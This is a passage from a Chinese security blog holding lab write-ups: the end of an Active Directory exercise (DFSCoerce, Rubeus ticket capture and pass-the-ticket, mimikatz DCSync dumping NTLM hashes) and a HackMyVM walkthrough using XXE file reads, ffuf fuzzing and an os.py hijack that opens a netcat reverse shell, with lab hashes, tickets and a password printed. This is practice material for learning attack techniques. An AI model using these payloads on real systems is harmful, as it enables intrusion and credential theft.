<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# proxy -f proxychains4.conf -q python3 ../script/AD/dfscoerce.py -u &quot;WIN19$&quot; -hashes :d41fef724adf6f2ed2cbb5a4ebd186c9 -d xiaorang.lab WIN19 172.22.4.7</span><br><span class="line">[-] Connecting to ncacn_np:172.22.4.7[\PIPE\netdfs]</span><br><span class="line">[+] Successfully bound!</span><br><span class="line">[-] Sending NetrDfsRemoveStdRoot!</span><br><span class="line">NetrDfsRemoveStdRoot</span><br><span class="line">ServerName:                      &#x27;WIN19\x00&#x27;</span><br><span class="line">RootShare:                       &#x27;test\x00&#x27;</span><br><span class="line">ApiFlags:                        1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DFSNM SessionError: code: 0x490 - ERROR_NOT_FOUND - Element not found.</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\lvv\Desktop&gt;Rubeus.exe monitor /interval:1 /filteruser:DC01$</span><br><span class="line"></span><br><span class="line">   ______        _</span><br><span class="line">  (_____ \      | |</span><br><span class="line">   _____) )_   _| |__  _____ _   _  ___</span><br><span class="line">  |  __  /| | | |  _ \| ___ | | | |/___)</span><br><span class="line">  | |  \ \| |_| | |_) ) ____| |_| |___ |</span><br><span class="line">  |_|   |_|____/|____/|_____)____/(___/</span><br><span class="line"></span><br><span class="line">  v2.2.0</span><br><span class="line"></span><br><span class="line">[*] Action: TGT Monitoring</span><br><span class="line">[*] Target user     : DC01$</span><br><span class="line">[*] Monitoring every 1 seconds for new TGTs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] 2025/4/18 4:54:32 UTC - Found new TGT:</span><br><span class="line"></span><br><span class="line">  User                  :  DC01$@XIAORANG.LAB</span><br><span class="line">  StartTime             :  2025/4/18 10:28:04</span><br><span class="line">  EndTime               :  2025/4/18 20:28:04</span><br><span class="line">  RenewTill             :  2025/4/25 10:28:04</span><br><span class="line">  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable</span><br><span class="line">  Base64EncodedTicket   :</span><br><span class="line"></span><br><span class="line">    doIFlDCCBZCgAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRn</span><br><span class="line">    dBsMWElBT1JBTkcuTEFCo4IEVDCCBFCgAwIBEqEDAgECooIEQgSCBD6F05kURrtAGLPwnEu0x0RxvAPS3m5aRx/bjVuGQLR7b0+L</span><br><span class="line">    x5X557jubFee2VfyECSf1RICTWkdJttbkCj4s6IMQrVpe8jFgy3Uki4NC0WdUfzH1nIiJSCq0lRPzgI88NGOrQEbDaurBzq150lY</span><br><span class="line">    i68ssuARb6DWCu6HYLjq66NSI53LNGAHqlNVoU+83ZOhJboPDjY2XL74OXFh0Qr57fWAbUOWegzVPHFicFshmeiMv111lfJr0X6Q</span><br><span class="line">    aqATuWtvoSsDI+/v3HyGMlqmlqJmmt0coW9z0L6V52yL7XA2YfXod7N+hWb/gclV5+C1G7GNj/uM3Zi5DyJ9kk+IuWHKWRRrz7JR</span><br><span class="line">    iPDy9zMJWBDgeMsEEmB/uh492tq+i3g8o49PocQ2TqcnRBPCiAEbpWhpz/LDb6P6f+ySqupcTcM5q9G+6CT6Rj/aMDAjqZEsRpfb</span><br><span class="line">    agn3XEjKWbF+kpAuuvr+eGd0xICbySdM21JRTjqZmZmUPkEe5Y0zKH+wVUUVJOAv8BVeKirxdKtYyDYiudFtUUGGkIzt2Z3J1yJY</span><br><span class="line">    GA8B90UklsraI8O6Q83i2nE11WkcxEXceYh7PBoeL6ivncb8UqZK2Nh07+1QlILNCx+5WFFLjNSoBLhofg3TIsPCr2zFNXTNbBPv</span><br><span class="line">    zP+bjqJawf7BY0KUWNLvgAltKMXX1T9pzNREspsKwRMjXZgsyTbil3reoEciEexNtXVhWxrk+xbp9DIL/74f4rafpIMsi7myoH6a</span><br><span class="line">    u1kjVexmmP4wOWp7KGvMm1gNp+XeakyHPiFlqIt4V0b4KGfd9Zd3rtQI3gtM7oeUm6PDlEn9vK0MVBpZZJeW6IDkZdXC7SBmPM1z</span><br><span class="line">    p0uno3wGRj0MuqqnPaV8XRJR0sEaNGD8HABfQkdCMHm5GQ8w71AIEy9i2otNPegf6P0j4EPsNwtyo2o97GKu/y27tvKv1FH43S4G</span><br><span class="line">    ij5gjiKBxIn2JtQ9oPvb0v+2SZWU08xE6v+b79PsWvr5STsl4eUJHnTuXizQfsY597gQAVgKD7vKeIXEsgb11VVP9HCtUjxCmBNS</span><br><span class="line">    25QzZvXbuWkEJ6k/7AYu0qvT3auHC1cbf4MmuMrc/DlT4MphkuUF5j8hfSEgEAVWhVZVuPZA3v6C+O8PYmDl1d9lT6JjZ5wuQrAG</span><br><span class="line">    Dwt7+cZ9wzuWLDUkB1dtiTm0cuFLXAmOLLDjpSWxIXK2B9TNAagAq2slNrb775ovLLdo/swtuRAKazjqgCAygra59RWoqP+loVv8</span><br><span class="line">    nxii1cB/M4tFLpGuZlTdOnyME8JT8D40++QW5IxMPffywi5tpjhDUnVC1wtK49BOaljvJKH8LcWHWyALrv2j8De6HPabKhCcnDiY</span><br><span class="line">    /w7QHVbcAh/Jo64uH2aYRSQEz5j7oGpAAP3ENCvzEaV8e/53wwRqjyife177PX7j9/ZfoqzfiRnr1kjeHIZsGw5zYyTmLbB/91Np</span><br><span class="line">    RN2jgeMwgeCgAwIBAKKB2ASB1X2B0jCBz6CBzDCByTCBxqArMCmgAwIBEqEiBCClV6tyB9NAYvRnxe9wuyHOhysxVh63TouQkdqL</span><br><span class="line">    8MLxbKEOGwxYSUFPUkFORy5MQUKiEjAQoAMCAQGhCTAHGwVEQzAxJKMHAwUAYKEAAKURGA8yMDI1MDQxODAyMjgwNFqmERgPMjAy</span><br><span class="line">    NTA0MTgxMjI4MDRapxEYDzIwMjUwNDI1MDIyODA0WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDFhJQU9S</span><br><span class="line">    QU5HLkxBQg==</span><br><span class="line"></span><br><span class="line">[*] Ticket cache size: 1</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>导入 TGT 然后 DCSync</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe ptt /ticket:doIFlDCCBZCgAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMWElBT1JBTkcuTEFCo4IEVDCCBFCgAwIBEqEDAgECooIEQgSCBD6rh73GDFsxBznVrGsdmcNb9fO1z8fVnV/kQUwXHY0vvUHSorZebamFLkiZi+LEkih3n4TJMOlCI8vlnlS5lPlr03uPc5nd6Pw7PWoVw7m2UH/TmMy4nuBKVVbKEIImNbFyhTleg75qJ+5D224ws/fpRGtQyH0WPmyMbevlI+xTTOLJGe9+YScZMva/hvc2nPq09ZNNzIMo8erEYpJCv1VucuzcoUrJFGTtASWqa0Aaeza+mypwP7OGmc2qnQEMu8l1XIEqe7JYdY934vsm37k8KarPLFlzyOhbzDW4t/GjlZ1aHXSLj332T90BxfZKoSe7tnA8cldicFQ8LmGBWBKeKms6sc8K4KQVGMdhyjno5L5jeKqtL49oc+a44kyJYlGjXnKpep5seUp3+2TXXvmF9/HnHSG+M6QQpepWGdfk6diRhgDvZyq1AX6GggRsXfIEpE721UcTowO2HQOfsv+W++pTiAoEvrkU6ciJ3VI3EZFelGkq3hfZ3MQydIdBCPVeaDwE1fcp05wGuDmuFDhf+C1nelwaTqYJIZScVgR+7o4FcGpStyycsbBMfzdasL70KSV3se6ZlvY24/Binnb3YOHMpWkpLRjUovQ7ep2fCN0f6Pt/P8JTCVC0oCFIy05otlw3n8nd4NctrNBWQBevIiuAobMrJ1Ww5UbSQHrCF6hTV6NTbL1irI3wR10rwNkaxWpspvcL5/HOTzXXRtq619o0lTdpz60KSroci5nuj4WfPtQ6ESiU8c4P9Y/exWUmhOGN10Wg1t4j4k+agTrvK2dy2ybLn1FNkqWMfMr3vcUm8BU7ESstKZp47FG1pkaQl6/bjGwElN0BhycbT8L1yxIj+rFspX3d6olXwiMIaF50EV5DM1V3oH/OJu5sHbIFqrGkRqooDTfrHyF8c1AnruzDtD2lxipt043llvOURkRj8Qd/qIiRZBqnYo4RD95J9J8Jbim35hFzbuV5PMS5Ekw9oRfzsGCD5VeKBb9i02mJTvWUqJjZi/YWI9wKaeKKCTKHYKKSmDfkJlF4gLUp12XwuTe4zEwhXUgBYEC7N7EA6u0/9dxwL5AWaRtOqL05rgFu2Ix2+wfBu1n4ToxGmYke44n6JSSXCqKW2KPkznAU0QPvhcYwjZsOFo4R/bVe9qQAcHBLwQ+9fq8DZBnRStKlgmIMeJXCPAPv5da69p2BnR4Bq+X71X5pWB4C0xHZtmxZ71ahe+cZYmDaap8SEvI7BDTkKaDDnvp3cLSVvX5k5uGrjq06yKqpYjlcfai1Yy8GXlecqf2xQ8b6RjkdPkHKVLQZdGZdZMc77Bj5IXwlGvwSQK5PMxo4z1zceza8WQ7WM/iIVwwDAEklXK9bW3pjfHCX9sB5YxAUA/BbJMxuSc1Q2yMpc8CrRNoNNPY184wjlPMAE0wLtAkkiJJlmhkupOA7ZpdlAwvYPEujgeMwgeCgAwIBAKKB2ASB1X2B0jCBz6CBzDCByTCBxqArMCmgAwIBEqEiBCCkn5s0Ub8lLXnRynzBbuyWO7uYW7F68Wp1NYL+h5IWoqEOGwxYSUFPUkFORy5MQUKiEjAQoAMCAQGhCTAHGwVEQzAxJKMHAwUAYKEAAKURGA8yMDI1MDIxMDA1Mjg0N1qmERgPMjAyNTAyMTAxNTI4NDdapxEYDzIwMjUwMjE3MDUyODQ3WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDFhJQU9SQU5HLkxBQg==</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::dcsync /all /csv&quot;</span><br><span class="line">[DC] &#x27;xiaorang.lab&#x27; will be the domain</span><br><span class="line">[DC] &#x27;DC01.xiaorang.lab&#x27; will be the DC server</span><br><span class="line">[DC] Exporting domain &#x27;xiaorang.lab&#x27;</span><br><span class="line">[rpc] Service  : ldap</span><br><span class="line">[rpc] AuthnSvc : GSS_NEGOTIATE (9)</span><br><span class="line">502     krbtgt  767e06b9c74fd628dd13785006a9092b        514</span><br><span class="line">1105    Aldrich 98ce19dd5ce74f670d230c7b1aa016d0        512</span><br><span class="line">1106    Marcus  b91c7cc463735bf0e599a2d0a04df110        512</span><br><span class="line">1112    WIN-3X7U15C2XDM$        c3ddf0ffd17c48e6c40e6eda9c9fbaf7        4096</span><br><span class="line">1113    WIN-YUUAW2QG9MF$        125d0e9790105be68deb6002690fc91b        4096</span><br><span class="line">1000    DC01$   23414273a692373e6e076d5fdbb2c213        532480</span><br><span class="line">500     Administrator   4889f6553239ace1f7c47fa2c619c252        512</span><br><span class="line">1103    FILESERVER$     dd213f63df5b16b2daa567705ca88ac7        4096</span><br><span class="line">1104    WIN19$  b6547b5e9c27c42b5cb096f1c922bc3a        528384</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以拿到域控的哈希</p>
<p>然后登录即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\flag&gt; type flag04.txt</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://lvzhouhang.xyz/2025/04/17/Hackmyvm-system/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/touxiang.jpg">
      <meta itemprop="name" content="lvzhouhang">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="lvzhouhang">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content=" | lvzhouhang">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/04/17/Hackmyvm-system/" class="post-title-link" itemprop="url">HackmyVM-system</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2025-04-17 15:21:48" itemprop="dateCreated datePublished" datetime="2025-04-17T15:21:48+08:00">2025-04-17</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-04-18 17:01:37" itemprop="dateModified" datetime="2025-04-18T17:01:37+08:00">2025-04-18</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/HackMyVM/" itemprop="url" rel="index"><span itemprop="name">HackMyVM</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>5.1k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>5 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><p>arp-scan -l</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129</span><br><span class="line">Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.31.1    0a:00:27:00:00:11       (Unknown: locally administered)</span><br><span class="line">192.168.31.2    08:00:27:72:be:a6       PCS Systemtechnik GmbH</span><br><span class="line">192.168.31.141  08:00:27:27:28:54       PCS Systemtechnik GmbH</span><br></pre></td></tr></table></figure>

<p>192.168.31.141就是靶机ip</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# nmap 192.168.31.141</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-17 03:39 EDT</span><br><span class="line">Nmap scan report for 192.168.31.141</span><br><span class="line">Host is up (0.0029s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 08:00:27:27:28:54 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>

<h1 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h1><p>有一个登录的页面，通过查看请求头可以发现他是以xml的格式传输的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;details&gt;&lt;email&gt;123@123.com&lt;/email&gt;&lt;password&gt;123&lt;/password&gt;&lt;/details&gt;</span><br></pre></td></tr></table></figure>

<p>试一试xxe注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE test [ </span><br><span class="line">&lt;!ENTITY test1 SYSTEM &quot;file:///etc/passwd&quot;&gt; </span><br><span class="line">]&gt;&lt;details&gt;&lt;email&gt;$test1;&lt;/email&gt;&lt;password&gt;123&lt;/password&gt;&lt;/details&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;p align=&#x27;center&#x27;&gt; &lt;font color=white size=&#x27;5pt&#x27;&gt; root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">messagebus:x:104:110::/nonexistent:/usr/sbin/nologin</span><br><span class="line">avahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin</span><br><span class="line">sshd:x:106:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin</span><br><span class="line">david:x:1000:1000::/home/david:/bin/bash</span><br><span class="line"> is already registered! &lt;/font&gt; &lt;/p&gt;</span><br></pre></td></tr></table></figure>

<p>读取david用户的私钥尝试登录，但是会登录失败，通过fuzz可以知道/home/david还有一个.viminfo</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/quickhits.txt -u http://192.168.31.141/magic.php  -d &#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;file:///home/david/FUZZ&quot;&gt; ]&gt; &lt;details&gt;&lt;email&gt;&amp;xxe;&lt;/email&gt;&lt;password&gt;das&lt;/password&gt;&lt;/details&gt;&#x27; --fw 11</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"> # This viminfo file was generated by Vim 8.2.</span><br><span class="line"># You may edit it if you&#x27;re careful!</span><br><span class="line"></span><br><span class="line"># Viminfo version</span><br><span class="line">|1,4</span><br><span class="line"></span><br><span class="line"># Value of &#x27;encoding&#x27; when this file was written</span><br><span class="line">*encoding=utf-8</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># hlsearch on (H) or off (h):</span><br><span class="line">~h</span><br><span class="line"># Command Line History (newest to oldest):</span><br><span class="line">:wq!</span><br><span class="line">|2,0,1648909714,,&quot;wq!&quot;</span><br><span class="line"></span><br><span class="line"># Search String History (newest to oldest):</span><br><span class="line"></span><br><span class="line"># Expression History (newest to oldest):</span><br><span class="line"></span><br><span class="line"># Input Line History (newest to oldest):</span><br><span class="line"></span><br><span class="line"># Debug Line History (newest to oldest):</span><br><span class="line"></span><br><span class="line"># Registers:</span><br><span class="line"></span><br><span class="line"># Password file Created:</span><br><span class="line">&#x27;0  1  3  /usr/local/etc/mypass.txt</span><br><span class="line">|4,48,1,3,1648909714,&quot;/usr/local/etc/mypass.txt&quot;</span><br><span class="line"></span><br><span class="line"># History of marks within files (newest to oldest):</span><br><span class="line"></span><br><span class="line">&gt; /usr/local/etc/mypass.txt</span><br><span class="line">	*	1648909713	0</span><br><span class="line">	&quot;	1	3</span><br><span class="line">	^	1	4</span><br><span class="line">	.	1	3</span><br><span class="line">	+	1	3</span><br></pre></td></tr></table></figure>

<p>然后读取/usr/local/etc/mypass.txt文件</p>
<p>david的密码为<code>h4ck3rd4v!d </code></p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>上传一个pspy64查看，发现每隔一段时间会运行一次suid.py文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2025/04/18 04:01:01 CMD: UID=0     PID=670    | /bin/sh -c /usr/bin/python3.9 /opt/suid.py</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#suid.py</span><br><span class="line">from os import system</span><br><span class="line">from pathlib import Path</span><br><span class="line"></span><br><span class="line"># Reading only first line</span><br><span class="line">try:</span><br><span class="line">    with open(&#x27;/home/david/cmd.txt&#x27;, &#x27;r&#x27;) as f:</span><br><span class="line">        read_only_first_line = f.readline()</span><br><span class="line">    # Write a new file</span><br><span class="line">    with open(&#x27;/tmp/suid.txt&#x27;, &#x27;w&#x27;) as f:</span><br><span class="line">        f.write(f&quot;&#123;read_only_first_line&#125;&quot;)</span><br><span class="line">    check = Path(&#x27;/tmp/suid.txt&#x27;)</span><br><span class="line">    if check:</span><br><span class="line">        print(&quot;File exists&quot;)</span><br><span class="line">        try:</span><br><span class="line">            os.system(&quot;chmod u+s /bin/bash&quot;)</span><br><span class="line">        except NameError:</span><br><span class="line">            print(&quot;Done&quot;)</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;File not exists&quot;)</span><br><span class="line">except FileNotFoundError:</span><br><span class="line">    print(&quot;File not exists&quot;)</span><br></pre></td></tr></table></figure>

<p>这个脚本永远不会执行chmod，查看是否可以劫持</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import sys; print(sys.path)&#x27;</span><br><span class="line">[&#x27;&#x27;, &#x27;/usr/lib/python39.zip&#x27;, &#x27;/usr/lib/python3.9&#x27;, &#x27;/usr/lib/python3.9/lib-dynload&#x27;, &#x27;/usr/local/lib/python3.9/dist-packages&#x27;, &#x27;/usr/lib/python3/dist-packages&#x27;]</span><br><span class="line">david@system:/usr/lib/python3.9$ find ./ -writable 2&gt;/dev/null</span><br><span class="line">./os.py</span><br></pre></td></tr></table></figure>

<p>向os.py尾部添加</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import subprocess</span><br><span class="line">def shell():</span><br><span class="line">    import subprocess</span><br><span class="line">    subprocess.call(&quot;nc&quot; + &quot;192.168.31.129 9999 -e /bin/bash&quot;, shell=True)</span><br><span class="line">shell()</span><br></pre></td></tr></table></figure>

<p>然后监听一个端口静静等shell弹回来</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://lvzhouhang.xyz/2025/04/17/Hackmyvm-Blackhat/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/touxiang.jpg">
      <meta itemprop="name" content="lvzhouhang">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="lvzhouhang">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content=" | lvzhouhang">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
